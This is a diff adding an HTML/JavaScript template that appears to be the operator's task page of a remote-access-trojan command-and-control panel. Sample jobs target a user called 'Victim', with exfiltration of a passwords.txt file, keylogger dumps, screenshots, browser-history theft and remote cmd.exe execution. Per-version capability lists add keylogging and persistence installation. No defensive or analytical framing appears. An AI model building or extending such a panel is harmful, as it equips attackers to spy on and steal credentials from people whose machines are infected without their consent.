@@ -1,0 +1,324 @@
+{% extends "base.html.j2" %}
+{% block title %}Tasks{% endblock title %}
+{% block content %}
+<style>
+    .task-list {
+        border-right: 2px solid var(--outline);
+        height: calc(100vh - 150px);
+        overflow-y: auto;
+        padding-right: 15px;
+    }
+
+    .task-item {
+        border: 1px solid var(--outline);
+        border-radius: 5px;
+        padding: 10px;
+        margin-bottom: 10px;
+        background-color: var(--light-bg);
+        transition: all 0.2s;
+    }
+
+    .task-item:hover {
+        background-color: var(--hover-bg);
+        cursor: pointer;
+    }
+
+    .task-client {
+        font-weight: bold;
+        color: var(--blue);
+    }
+
+    .task-type {
+        font-size: 0.8rem;
+        color: var(--light-gray);
+    }
+
+    .task-content {
+        font-size: 0.9rem;
+        margin-top: 5px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    .form-container {
+        padding: 20px;
+        border-radius: 8px;
+        background-color: var(--gray);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .select2-container {
+        width: 100% !important;
+    }
+
+    .task-input-section {
+        display: none;
+    }
+
+    .task-input-section.active {
+        display: block;
+    }
+</style>
+
+<div class="container-fluid mt-4">
+    <div class="row">
+        <!-- Task List Column -->
+        <div class="col-md-3">
+            <div class="card">
+                <div class="card-header text-white" style="background-color: var(--blue);">
+                    Pending Tasks (12)
+                </div>
+                <div class="card-body task-list">
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #42</span>
+                            <small class="text-muted">10 min ago</small>
+                        </div>
+                        <div class="task-type">System Info Collection</div>
+                        <div class="task-content">Gather all system information including installed software...</div>
+                    </div>
+                    
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #17</span>
+                            <small class="text-muted">25 min ago</small>
+                        </div>
+                        <div class="task-type">File Upload</div>
+                        <div class="task-content">C:\Users\Victim\Documents\passwords.txt</div>
+                    </div>
+                    
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #89</span>
+                            <small class="text-muted">1 hour ago</small>
+                        </div>
+                        <div class="task-type">Screenshot</div>
+                        <div class="task-content">Capture desktop screenshot and upload</div>
+                    </div>
+                    
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #5</span>
+                            <small class="text-muted">2 hours ago</small>
+                        </div>
+                        <div class="task-type">Keylogger Dump</div>
+                        <div class="task-content">Upload keylogger data from the past 24 hours</div>
+                    </div>
+                    
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #31</span>
+                            <small class="text-muted">3 hours ago</small>
+                        </div>
+                        <div class="task-type">Browser History</div>
+                        <div class="task-content">Collect Chrome and Firefox browsing history</div>
+                    </div>
+                    
+                    <div class="task-item">
+                        <div class="d-flex justify-content-between">
+                            <span class="task-client">Client #42</span>
+                            <small class="text-muted">5 hours ago</small>
+                        </div>
+                        <div class="task-type">Command Execution</div>
+                        <div class="task-content">whoami /all > C:\temp\userinfo.txt</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Task Creation Column -->
+        <div class="col-md-9">
+            <div class="card">
+                <div class="card-header text-white" style="background-color: var(--green);">
+                    Create new Task
+                </div>
+                <div class="card-body" style="height: calc(100vh - 150px);">
+                    <form>
+                        <div class="form-group mb-4">
+                            <label for="clientSelect">Client</label>
+                            <select class="form-select" id="clientSelect" required>
+                                <option value="">-- Select a client --</option>
+                                <option value="5" data-version="1.2">Client #5 - Online (Windows 10) [v1.2]</option>
+                                <option value="17" data-version="1.5">Client #17 - Online (Windows 11) [v1.5]</option>
+                                <option value="23" data-version="1.0">Client #23 - Offline (Windows 7) [v1.0]</option>
+                                <option value="31" data-version="1.3">Client #31 - Online (Windows 10) [v1.3]</option>
+                                <option value="42" data-version="1.5">Client #42 - Online (Windows 11) [v1.5]</option>
+                                <option value="56" data-version="1.1">Client #56 - Offline (Windows 10) [v1.1]</option>
+                                <option value="89" data-version="1.4">Client #89 - Online (Windows 10) [v1.4]</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group mb-4" id="taskTypeContainer" style="display: none;">
+                            <label for="taskType">Task Type</label>
+                            <select class="form-control" id="taskType" required>
+                                <!-- Options will be populated by JavaScript based on client version -->
+                            </select>
+                        </div>
+                        
+                        <div class="form-group mb-4" id="taskNameContainer" style="display: none;">
+                            <label for="taskName">Task Name</label>
+                            <input type="text" class="form-control" id="taskName" placeholder="e.g., Collect Browser Data">
+                        </div>
+                        
+                        <!-- Dynamic input sections for different task types -->
+                        <div id="taskInputSections">
+                            <!-- Command Execution -->
+                            <div class="task-input-section" id="cmdInputSection">
+                                <div class="form-group mb-4">
+                                    <label for="taskCommand">Command</label>
+                                    <textarea class="form-control" id="taskCommand" rows="3" placeholder="Enter command to execute..."></textarea>
+                                    <small class="form-text text-muted">Command will be executed in cmd.exe</small>
+                                </div>
+                            </div>
+                            
+                            <!-- File Upload -->
+                            <div class="task-input-section" id="fileInputSection">
+                                <div class="form-group mb-4">
+                                    <label for="filePath">File Path</label>
+                                    <input type="text" class="form-control" id="filePath" placeholder="C:\path\to\file.txt">
+                                    <small class="form-text text-muted">Full path to the file you want to upload</small>
+                                </div>
+                            </div>
+                            
+                            <!-- Screenshot (no input needed) -->
+                            <div class="task-input-section" id="screenshotInputSection">
+                                <div class="alert alert-info">
+                                    No additional input needed. The client will capture and upload a screenshot.
+                                </div>
+                            </div>
+                            
+                            <!-- System Info (no input needed) -->
+                            <div class="task-input-section" id="sysinfoInputSection">
+                                <div class="alert alert-info">
+                                    No additional input needed. The client will collect system information.
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="d-flex justify-content-end">
+                            <button type="submit" class="btn btn-primary" id="submitBtn" disabled>Create Task</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Include jQuery FIRST -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<!-- Then include Select2 which depends on jQuery -->
+<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
+<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>
+
+
+<script>
+    // Task types supported by each version
+    const versionCapabilities = {
+        '1.0': ['SCREENSHOT', 'SYSINFO'],
+        '1.1': ['SCREENSHOT', 'SYSINFO', 'SENDFILE'],
+        '1.2': ['SCREENSHOT', 'SYSINFO', 'SENDFILE', 'CUSTOMCMD'],
+        '1.3': ['SCREENSHOT', 'SYSINFO', 'SENDFILE', 'CUSTOMCMD', 'BROWSERDATA'],
+        '1.4': ['SCREENSHOT', 'SYSINFO', 'SENDFILE', 'CUSTOMCMD', 'BROWSERDATA', 'KEYLOGGER'],
+        '1.5': ['SCREENSHOT', 'SYSINFO', 'SENDFILE', 'CUSTOMCMD', 'BROWSERDATA', 'KEYLOGGER', 'PERSISTENCE']
+    };
+
+    // Task type display names
+    const taskTypeNames = {
+        'SCREENSHOT': 'Screenshot',
+        'SYSINFO': 'System Information',
+        'SENDFILE': 'File Upload',
+        'CUSTOMCMD': 'Command Execution',
+        'BROWSERDATA': 'Browser Data Collection',
+        'KEYLOGGER': 'Keylogger Dump',
+        'PERSISTENCE': 'Persistence Installation'
+    };
+
+    $(document).ready(function() {
+        console.log("Document ready"); // Debugging
+        
+        // Initialize Select2 for client selection
+        $('#clientSelect').select2({
+            placeholder: "Select a client",
+            allowClear: true
+        });
+        
+        // Client selection changed
+        $('#clientSelect').on('change', function() {
+            console.log("Client selection changed"); // Debugging
+            updateTaskTypes();
+        });
+        
+        function updateTaskTypes() {
+            const selectedOption = $('#clientSelect').find(':selected');
+            const clientVersion = selectedOption.data('version');
+            const taskTypeSelect = $('#taskType');
+            
+            console.log("Selected client version:", clientVersion); // Debugging
+            
+            // Clear and disable task type dropdown
+            taskTypeSelect.empty().prop('disabled', true);
+            $('#taskTypeContainer').hide();
+            $('#taskNameContainer').hide();
+            $('#submitBtn').prop('disabled', true);
+            
+            // Hide all input sections
+            $('.task-input-section').removeClass('active');
+            
+            if (clientVersion) {
+                // Populate task types based on client version
+                const supportedTypes = versionCapabilities[clientVersion] || [];
+                
+                console.log("Supported types:", supportedTypes); // Debugging
+                
+                if (supportedTypes.length > 0) {
+                    taskTypeSelect.append('<option value="">-- Select task type --</option>');
+                    supportedTypes.forEach(type => {
+                        taskTypeSelect.append(`<option value="${type}">${taskTypeNames[type]}</option>`);
+                    });
+                    
+                    taskTypeSelect.prop('disabled', false);
+                    $('#taskTypeContainer').show();
+                }
+            }
+        }
+        
+        // Task type selection changed
+        $('#taskType').on('change', function() {
+            const taskType = $(this).val();
+            
+            console.log("Task type selected:", taskType); // Debugging
+            
+            // Hide all input sections
+            $('.task-input-section').removeClass('active');
+            
+            if (taskType) {
+                $('#taskNameContainer').show();
+                
+                // Show appropriate input section based on task type
+                switch(taskType) {
+                    case 'CUSTOMCMD':
+                        $('#cmdInputSection').addClass('active');
+                        break;
+                    case 'SENDFILE':
+                        $('#fileInputSection').addClass('active');
+                        break;
+                    case 'SCREENSHOT':
+                        $('#screenshotInputSection').addClass('active');
+                        break;
+                    case 'SYSINFO':
+                        $('#sysinfoInputSection').addClass('active');
+                        break;
+                    // Add cases for other task types as needed
+                }
+                
+                $('#submitBtn').prop('disabled', false);
+            } else {
+                $('#taskNameContainer').hide();
+                $('#submitBtn').prop('disabled', true);
+            }
+        });
+    });
+</script>
+{% endblock content %}
